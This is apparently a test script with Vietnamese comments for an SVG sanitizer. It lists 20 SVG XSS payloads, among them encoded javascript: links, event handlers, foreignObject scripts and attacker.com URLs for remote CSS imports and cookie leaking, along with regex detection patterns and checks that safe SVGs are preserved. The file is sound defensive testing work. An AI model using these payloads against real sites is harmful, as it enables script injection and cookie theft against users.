import { readFileSync } from "fs";
import { fileURLToPath } from "url";
import { dirname, join } from "path";
import { sanitizeSvg } from "../src/utils/sanitizeSvg.js";

const __dirname = dirname(fileURLToPath(import.meta.url));

console.log("=== BẮT ĐẦU KIỂM THỬ SVG SANITIZER (P05) ===");

// ── 1. Kiểm tra 20 payloads XSS SVG phổ biến ─────────────────────────────────
const xssPayloads = [
  // 1. Thẻ script cơ bản
  { name: "Basic script tag", payload: '<svg><script>alert("XSS")</script></svg>' },
  // 2. Thẻ script có href data: URI
  { name: "Script with data URI", payload: '<svg><script href="data:text/javascript,alert(1)"></script></svg>' },
  // 3. Thuộc tính onload trên thẻ svg
  { name: "SVG onload attribute", payload: '<svg onload="alert(1)"><circle r="10"/></svg>' },
  // 4. Thuộc tính onload trên phần tử con
  { name: "Circle onload attribute", payload: '<svg><circle cx="10" cy="10" r="5" onload="alert(1)"/></svg>' },
  // 5. Thuộc tính onerror trên phần tử ảnh
  { name: "Image onerror attribute", payload: '<svg><image href="invalid.jpg" onerror="alert(1)"/></svg>' },
  // 6. Liên kết href chứa javascript:
  { name: "Anchor javascript: href", payload: '<svg><a href="javascript:alert(1)"><text>Click</text></a></svg>' },
  // 7. Liên kết href chứa jAvAsCrIpT: hoa thường hỗn hợp
  { name: "Mixed-case javascript: href", payload: '<svg><a href="jAvAsCrIpT:alert(1)"><text>Click</text></a></svg>' },
  // 8. Liên kết href mã hóa HTML entity thập phân
  { name: "Decimal entity-encoded href", payload: '<svg><a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)"><text>Click</text></a></svg>' },
  // 9. Liên kết xlink:href chứa javascript:
  { name: "xlink:href with javascript:", payload: '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="javascript:alert(1)"><text>Click</text></a></svg>' },
  // 10. Liên kết xlink:href mã hóa hex entity
  { name: "Hex entity-encoded xlink:href", payload: '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)"><text>Click</text></a></svg>' },
  // 11. Thẻ <set> lén đổi href sang javascript:
  { name: "SVG <set> modifying href", payload: '<svg><a href="#safe"><set attributeName="href" to="javascript:alert(1)"/><text>Click</text></a></svg>' },
  // 12. Thẻ <animate> lén đổi values sang javascript:
  { name: "SVG <animate> modifying href", payload: '<svg><a href="#safe"><animate attributeName="href" values="javascript:alert(1)"/><text>Click</text></a></svg>' },
  // 13. Thẻ <foreignObject> lồng iframe
  { name: "foreignObject with iframe", payload: '<svg><foreignObject width="100" height="100"><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>' },
  // 14. Thẻ <foreignObject> lồng xhtml script
  { name: "foreignObject with HTML script", payload: '<svg><foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>' },
  // 15. Thẻ <iframe> trực tiếp
  { name: "Direct <iframe> tag", payload: '<svg><iframe></iframe><rect width="10" height="10"/></svg>' },
  // 16. Thẻ <embed> thực thi plugin/flash
  { name: "Direct <embed> tag", payload: '<svg><embed src="evil.swf"/><circle r="5"/></svg>' },
  // 17. Thẻ <object> nhúng dữ liệu nguy hiểm
  { name: "Direct <object> tag", payload: '<svg><object data="evil.swf"></object></svg>' },
  // 18. Thẻ <style> chứa @import kéo CSS độc hại từ xa
  { name: "Style with @import url()", payload: '<svg><defs><style>@import url("https://attacker.com/malicious.css"); .cls { fill: red; }</style></defs></svg>' },
  // 19. Thẻ <style> chứa CSS url() rò rỉ dữ liệu ra server ngoài
  { name: "Style with external background url()", payload: '<svg><style>body { background: url("https://attacker.com/leak?cookie=1"); }</style></svg>' },
  // 20. Thẻ <use> trỏ tới SVG bên ngoài chứa payload
  { name: "<use> tag with external SVG URL", payload: '<svg><use href="https://attacker.com/evil.svg#exploit"/></svg>' },
];

let failedPayloadCount = 0;

for (const { name, payload } of xssPayloads) {
  const sanitized = sanitizeSvg(payload);

  const checks = [
    { rule: "Không chứa <script", test: /<script\b/i.test(sanitized) },
    { rule: "Không chứa javascript:", test: /javascript:/i.test(sanitized) },
    { rule: "Không chứa event handler on*", test: /\son\w+\s*=/i.test(sanitized) },
    { rule: "Không chứa foreignObject", test: /<foreignObject\b/i.test(sanitized) },
    { rule: "Không chứa iframe", test: /<iframe\b/i.test(sanitized) },
    { rule: "Không chứa embed", test: /<embed\b/i.test(sanitized) },
    { rule: "Không chứa object", test: /<object\b/i.test(sanitized) },
    { rule: "Không chứa @import", test: /@import\b/i.test(sanitized) },
    { rule: "Không chứa URL trỏ ra ngoài", test: /url\(\s*['"]?(?:https?:|\/\/)/i.test(sanitized) },
    { rule: "Không chứa href ra ngoài", test: /(?:href|xlink:href)\s*=\s*['"](?:https?:|\/\/)/i.test(sanitized) },
  ];

  const failedRules = checks.filter((c) => c.test);
  if (failedRules.length > 0) {
    console.error(`❌ Payload thất bại: "${name}"`);
    console.error(`   Đầu vào:  ${payload}`);
    console.error(`   Đầu ra:   ${sanitized}`);
    console.error(`   Vi phạm:  ${failedRules.map((r) => r.rule).join(", ")}`);
    failedPayloadCount++;
  } else {
    console.log(`✓ [XSS] ${name} -> Đã vô hiệu hóa an toàn`);
  }
}

if (failedPayloadCount > 0) {
  console.error(`\n❌ Có ${failedPayloadCount} payload XSS chưa được ngăn chặn!`);
  process.exit(1);
}

console.log("\n✓ Toàn bộ 20/20 payload XSS SVG đều bị vô hiệu hóa hoàn toàn!");

// ── 2. Kiểm tra tính toàn vẹn của các SVG an toàn và hợp lệ ──────────────────
console.log("\n── Kiểm tra tính toàn vẹn của các thẻ và thuộc tính an toàn ──");

const safeTests = [
  {
    name: "Internal anchor in <use href='#icon'>",
    svg: '<svg><use href="#my-icon"/><rect width="10" height="10"/></svg>',
    verify: (s) => s.includes('href="#my-icon"'),
  },
  {
    name: "data:image/png base64 in <image>",
    svg: '<svg><image href="data:image/png;base64,iVBORw0KGgo=" width="20" height="20"/></svg>',
    verify: (s) => s.includes('href="data:image/png;base64,iVBORw0KGgo="'),
  },
  {
    name: "Local gradient fill url(#grad)",
    svg: '<svg><defs><linearGradient id="grad"><stop offset="0%" stop-color="#fff"/></linearGradient></defs><rect fill="url(#grad)"/></svg>',
    verify: (s) => s.includes('fill="url(#grad)"') && s.includes("<linearGradient"),
  },
];

for (const { name, svg, verify } of safeTests) {
  const result = sanitizeSvg(svg);
  if (!verify(result)) {
    console.error(`❌ Kiểm tra tính năng an toàn thất bại: "${name}"`);
    console.error(`   Kết quả: ${result}`);
    process.exit(1);
  }
  console.log(`✓ [Safe SVG] ${name} -> Được bảo toàn nguyên vẹn`);
}

// ── 3. Kiểm tra bảo toàn các mẫu SVG trong seed templates của Studio ─────────
console.log("\n── Kiểm tra bảo toàn 100% thẻ trong client seed templates ──");

const seedPath = join(__dirname, "../../client/src/features/studio/data/seed/templates.ts");
const seedContent = readFileSync(seedPath, "utf-8");

const seedSvgs = Array.from(seedContent.matchAll(/(?:svgBase|svgData):\s*`([\s\S]*?)`/g)).map((m) => m[1]);
console.log(`Tìm thấy ${seedSvgs.length} mẫu SVG trong seed templates.`);

function countTags(str, tagName) {
  const regex = new RegExp(`<${tagName}\\b`, "gi");
  return (str.match(regex) || []).length;
}

let seedTagMismatch = 0;
seedSvgs.forEach((rawSvg, idx) => {
  const sanitized = sanitizeSvg(rawSvg);
  const tagsToCheck = ["g", "path", "defs", "linearGradient"];

  for (const tag of tagsToCheck) {
    const beforeCount = countTags(rawSvg, tag);
    const afterCount = countTags(sanitized, tag);
    if (beforeCount !== afterCount) {
      console.error(`❌ Mẫu SVG ${idx + 1} mất thẻ <${tag}>: ban đầu ${beforeCount}, sau sanitize ${afterCount}`);
      seedTagMismatch++;
    }
  }
});

if (seedTagMismatch > 0) {
  console.error(`\n❌ Có lỗi sai lệch số lượng thẻ trong seed templates!`);
  process.exit(1);
}

console.log("✓ Mọi SVG trong seed templates giữ nguyên vẹn 100% số lượng thẻ g, path, defs, linearGradient!");
console.log("\n=== TẤT CẢ KIỂM THỬ SANITIZE SVG ĐÃ PASS HOÀN TOÀN ===");
